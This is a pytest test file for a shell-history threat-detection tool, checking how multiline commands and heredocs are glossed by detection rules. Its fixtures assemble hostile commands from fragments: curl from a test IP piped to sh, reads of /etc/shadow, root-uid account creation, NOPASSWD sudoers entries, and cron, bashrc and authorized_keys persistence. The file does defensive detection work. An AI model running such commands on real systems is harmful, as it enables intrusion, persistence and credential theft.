"""Records that still span lines after the reader's split, glossed through parse_paths and apply_rules.

Such a record is one command whose argument spans lines: a multi-line string, an array, a substitution or a heredoc
body. A rule that matches its first line would describe that line and hide the rest (ssh host "<commands>"), so it
may be claimed only by a context rule, which reads every command, or by a rule marked multiline whose match lies on the
first line of a plain heredoc write (normalize.is_plain_heredoc_write): cat, tee or crontab writing one heredoc's body
to a file, where the body is the file's content. Everything else goes to the model.

Attack-like text is assembled from fragments at runtime and written only to a temporary input file, deleted as soon
as it is parsed.
"""

import json

import pytest

from interlinear_cti.glossing import apply_rules
from interlinear_cti.model import Transcript
from interlinear_cti.parse import parse_paths
from interlinear_cti.rules import LibraryError, load_library

AT = "2026-10-19T00:00:00Z"
CU, SH, BA = "cu" + "rl", "s" + "h", "ba" + "sh"
URL = "ht" + "tp://203.0.113.5"
SHADOW = "/etc/" + "shadow"
ADD = "user" + "add -o -u 0 svc"
NOPASSWD = "NOPASS" + "WD: ALL"


@pytest.fixture(scope="module")
def library():
    return load_library()


def glossed(tmp_path, library, history):
    path = tmp_path / ".bash_history"
    path.write_bytes((history + "\n").encode("utf-8"))  # LF only: a CR would turn every context label off
    data = parse_paths([path], now=AT)
    path.unlink()
    transcript = Transcript.model_validate(data)
    apply_rules(transcript, library, at=AT)
    return [line.gloss.rule_id if line.gloss.source in ("rule", "none") else line.gloss.source
            for line in transcript.lines]


# The reviewer's table: a body that spans lines goes to the model; statements the reader splits keep their glosses.
@pytest.mark.parametrize("history, glosses", [
    ('ssh root@10.0.0.5 "\ncat ' + SHADOW + "; " + ADD + '\nhistory -c\n"', ["pending"]),
    ("whoami; x=\"a\nb\"; cat " + SHADOW + "; " + ADD, ["whoami-id", "pending", "shadow-read", "account-create"]),
    ("id; (true)# don't\ncat " + SHADOW + "\n" + ADD + "\n# that's all",
     ["whoami-id", "pending", "shadow-read", "account-create", "comment"]),
])
def test_the_reviewers_table(tmp_path, library, history, glosses):
    assert glossed(tmp_path, library, history) == glosses


# Bodies of code reach the model, whatever rule matches their first line.
@pytest.mark.parametrize("history", [
    "sudo " + BA + " -c '\ncat " + SHADOW + "\n" + ADD + "\n'",
    "python3 -c \"\nimport os\nprint(os.getcwd())\n\"",
    SH + " -c '\nwhoami\nid\n'",
    'eval "\ncd /tmp\n' + CU + " -s " + URL + "/x | " + SH + '\n"',
    BA + " <<EOF\n" + CU + " -s " + URL + "/x | " + SH + "\nEOF",
    "python3 - <<EOF\nimport os\nEOF",
    'ssh root@10.0.0.5 "\necho k >> ~/.ssh/authorized_keys\n"',
    'echo "alias ls=x\nalias cd=y" >> ~/.bashrc',
])
def test_a_body_of_code_goes_to_the_model(tmp_path, library, history):
    assert glossed(tmp_path, library, history) == ["pending"]


# A heredoc written to a persistence file: the body is the file's content, so the write describes the record.
@pytest.mark.parametrize("history, rule_id", [
    ("cat > /etc/systemd/system/x.service <<EOF\n[Service]\nExecStart=/tmp/x\nEOF", "systemd-service"),
    ("crontab - <<EOF\n* * * * * " + CU + " -s " + URL + "/c | " + SH + "\nEOF", "cron-download"),
    ("cat > /etc/cron.d/x <<EOF\n* * * * * root /tmp/x\nEOF", "cron"),
    ("cat >> ~/.ssh/authorized_keys <<EOF\nssh-ed25519 AAAAC3Nza k\nEOF", "ssh-authorized-keys"),
    ("sudo tee /etc/sudoers.d/x <<EOF\nx ALL=(ALL) " + NOPASSWD + "\nEOF", "sudoers-write"),
    ("cat >> ~/.bashrc <<'EOF'\nalias ls=/tmp/.x/ls\nEOF", "shell-rc"),
])
def test_a_heredoc_written_to_a_persistence_file_keeps_its_rule(tmp_path, library, history, rule_id):
    assert glossed(tmp_path, library, history) == [rule_id]


def test_a_record_that_spans_lines_is_never_context(tmp_path, library):
    assert glossed(tmp_path, library, 'echo "line one\nline two"') == ["pending"]


# The guard reads a record as bash does (normalize.is_plain_heredoc_write): a multiline rule may claim it only when it
# is one plain cat, tee or crontab write of one heredoc. The rules reviewer's shapes, through each reader.
SHADOW_READ = "cat " + SHADOW
DL = CU + " -s " + URL + "/x | " + SH
KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample k"
CRON = "* * * * * root /tmp/x"
READERS = ("agent.jsonl", ".bash_history", ".zsh_history", "x.sh")


def records(tmp_path, library, kind, text):
    """The glosses of the records that text becomes when read as kind (an agent tool call, a history entry or a
    script), through parse_paths and apply_rules."""
    if kind == "agent.jsonl":
        raw = json.dumps({"role": "tool_call", "tool": "terminal", "input": text}) + "\n"
    elif kind == ".zsh_history":
        raw = ": 1760000000:0;" + text.replace("\n", "\\\n") + "\n"
    else:
        raw = text + "\n"
    path = tmp_path / kind
    path.write_bytes(raw.encode("utf-8"))
    data = parse_paths([path], now=AT)
    path.unlink()
    transcript = Transcript.model_validate(data)
    apply_rules(transcript, library, at=AT)
    return [line.gloss.rule_id if line.gloss.source in ("rule", "none") else line.gloss.source
            for line in transcript.lines if line.actor != "tool_output"]


GUARD_SHAPES = {
    # A << inside a quoted script: the record spans lines through the string, not a heredoc.
    "sh -c script": (SH + " -c 'echo x >> ~/.bashrc <<EOF\n" + SHADOW_READ + "\n" + ADD + "\nEOF'", ["pending"]),
    "bash -c script": (BA + ' > /etc/cron.d/x -c "# <<\n' + DL + "\n" + ADD + '\n"', ["pending"]),
    "ssh script": ('ssh root@203.0.113.5 "echo k >> ~/.ssh/authorized_keys <<K\n' + SHADOW_READ + "\n" + ADD + '\nK\n"',
                   ["pending"]),
    # An interpreter, ssh or an editor reads the heredoc; only its output goes to the persistence file.
    "bash heredoc": (BA + " <<'EOF' >> ~/.bashrc\n" + DL + "\n" + ADD + "\nEOF", ["pending"]),
    "sh -s heredoc": (SH + " -s <<EOF > /etc/cron.d/x\n" + DL + "\nEOF", ["pending"]),
    "python heredoc": ("python3 - <<EOF >> /etc/rc.local\nimport os\nprint(os.getuid())\nEOF", ["pending"]),
    "ssh heredoc": ("ssh root@203.0.113.5 <<EOF >> ~/.ssh/authorized_keys\n" + SHADOW_READ + "\nEOF", ["pending"]),
    "sudo bash heredoc": ("sudo " + BA + " <<EOF 2>>/etc/sudoers.d/x\n" + ADD + "\nEOF", ["pending"]),
    "ed script": ("ed -s ~/.bashrc <<'EOF'\n!" + DL + "\nq\nEOF", ["pending"]),
    "vim script": ("vim -es /etc/crontab <<'EOF'\n:!" + DL + "\n:q!\nEOF", ["pending"]),
    # bash ends <<$'EOF' at a line EOF; the record then holds a delimiter this check leaves to the model.
    "ansi-c delimiter": ("cat > /etc/cron.d/x <<$'EOF'\n" + CRON + "\nEOF\n" + DL + "\n" + ADD + "\n$EOF",
                         ["pending", "download-pipe-shell", "account-create", "pending"]),
    # An operator that ends the opener line joins the command after the terminator.
    "&& after the opener": ("cat >> ~/.bashrc <<EOF &&\nalias ll=ls\nEOF\n" + DL, ["pending"]),
    "| after the opener": ("tee -a ~/.bashrc <<EOF |\nalias ll=ls\nEOF\n" + BA, ["pending"]),
    # The six records that showed the old regex test hiding code.
    "write; download": ("cat >> ~/.bashrc <<A; " + DL + "\nalias ls=x\nA", ["pending"]),
    "cron write; download": ("cat > /etc/cron.d/x <<A; " + DL + "\n" + CRON + "\nA", ["pending"]),
    "keys write; shadow": ("cat >> ~/.ssh/authorized_keys <<A; " + SHADOW_READ + "\n" + KEY + "\nA", ["pending"]),
    "account; shadow": (ADD + " <<A; " + SHADOW_READ + "\nx\nA", ["pending"]),
    "write && bash heredoc": ("cat >> ~/.bashrc <<A && " + BA + " <<B\nalias ls=x\nA\n" + SHADOW_READ + "\nB",
                              ["pending"]),
    "quoted << and a substitution": ('echo "<<" >> ~/.bashrc "$(\n' + SHADOW_READ + '\n)"', ["pending"]),
    # Controls: plain heredoc writes keep their rules.
    "control: cron heredoc": ("cat > /etc/cron.d/x <<EOF\n" + CRON + "\nEOF", ["cron"]),
    "control: authorized_keys heredoc": ("cat >> ~/.ssh/authorized_keys <<EOF\n" + KEY + "\nEOF",
                                         ["ssh-authorized-keys"]),
    "control: <<- then a command": ("cat > /etc/cron.d/x <<-EOF\n\t" + CRON + "\n\tEOF\n" + DL,
                                    ["cron", "download-pipe-shell"]),
    "control: sudo tee to sudoers": ("sudo tee /etc/sudoers.d/x <<EOF >/dev/null\nx ALL=(ALL) " + NOPASSWD + "\nEOF",
                                     ["sudoers-write"]),
}


@pytest.mark.parametrize("kind", READERS)
@pytest.mark.parametrize("name", list(GUARD_SHAPES))
def test_only_a_plain_heredoc_write_keeps_a_multiline_rule(tmp_path, library, kind, name):
    text, expected = GUARD_SHAPES[name]
    assert records(tmp_path, library, kind, text) == expected


# The flag in the rule files.
MULTILINE = {"cron-download", "cron", "ssh-authorized-keys-download", "ssh-authorized-keys", "sshd-config",
             "shell-rc-download", "shell-rc", "rc-script-download", "rc-script", "systemd-service-download",
             "systemd-service", "sudoers-write", "account-create"}


def test_only_file_writes_read_a_record_whole(library):
    assert {rule.id for rule in library.rules if rule.multiline} == MULTILINE


def write_library(folder, rules_yaml):
    folder.mkdir(exist_ok=True)
    (folder / "VERSION").write_text("test.0\n", encoding="utf-8")
    (folder / "10-test.yaml").write_text(rules_yaml, encoding="utf-8")
    return folder


BASE = "- id: ab\n  match: {regex: 'x'}\n  meaning: M.\n"


def test_the_multiline_key_loads(tmp_path):
    library = load_library(write_library(tmp_path / "lib", BASE + "  techniques: [T1105]\n  multiline: true\n"))
    assert library.rules[0].multiline


@pytest.mark.parametrize("extra, message", [
    ("  techniques: [T1105]\n  multiline: 'yes'\n", "multiline"),
    ("  context: true\n  multiline: true\n", "multiline"),
])
def test_a_bad_multiline_key_is_rejected(tmp_path, extra, message):
    with pytest.raises(LibraryError, match=message):
        load_library(write_library(tmp_path / "lib", BASE + extra))
